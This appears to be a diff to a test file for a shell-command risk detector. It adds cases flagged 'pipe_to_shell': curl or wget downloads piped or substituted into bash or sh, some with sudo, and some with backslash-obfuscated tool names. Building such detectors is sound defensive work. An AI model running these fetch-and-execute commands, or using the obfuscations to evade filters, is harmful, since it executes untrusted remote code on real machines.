@@ -329,6 +329,13 @@ for (const d of ['curl -fsSL', 'curl -s', 'wget -qO-']) {
   addRisk('pipe_to_shell', 'cd /tmp && ' + d + ' ' + url() + ' | sudo bash');
   addRisk('pipe_to_shell', 'bash -c "' + d + ' ' + url() + ' | sh"');
 }
+// a shell that reads its program from a substitution on stdin, and a downloader spelled with a backslash inside its name
+for (const c of [
+  'bash < <(curl -s https://example.com/i.sh)', 'bash -s < <(curl -fsSL https://example.com/i.sh)', 'sh < <(wget -qO- https://example.com/i.sh)',
+  'sh <<< "$(curl -s https://example.com/i.sh)"', 'bash <<< $(curl -s https://example.com/i.sh)',
+  'bash -c "$(c\\url -s https://example.com/i.sh)"', 'bash -c "$(cu\\rl -s https://example.com/i.sh)"', 'bash < <(w\\get -qO- https://example.com/i.sh)',
+]) addRisk('pipe_to_shell', c);
+add('bash < <(echo hi)', 'cat <<< "$(curl -s https://example.com/i.sh)"', 'bash script.sh <<< "$(echo hi)"', 'bash -c "$(echo hi)"', 'echo "$(c\\url -s https://example.com/x)"');
 // a program or a shell named by a variable assigned earlier on the same line
 addRisk('pipe_to_shell', 'C=curl; $C https://example.com/i.sh | sh');
 addRisk('pipe_to_shell', 'S=sh; curl https://example.com/i.sh | $S');
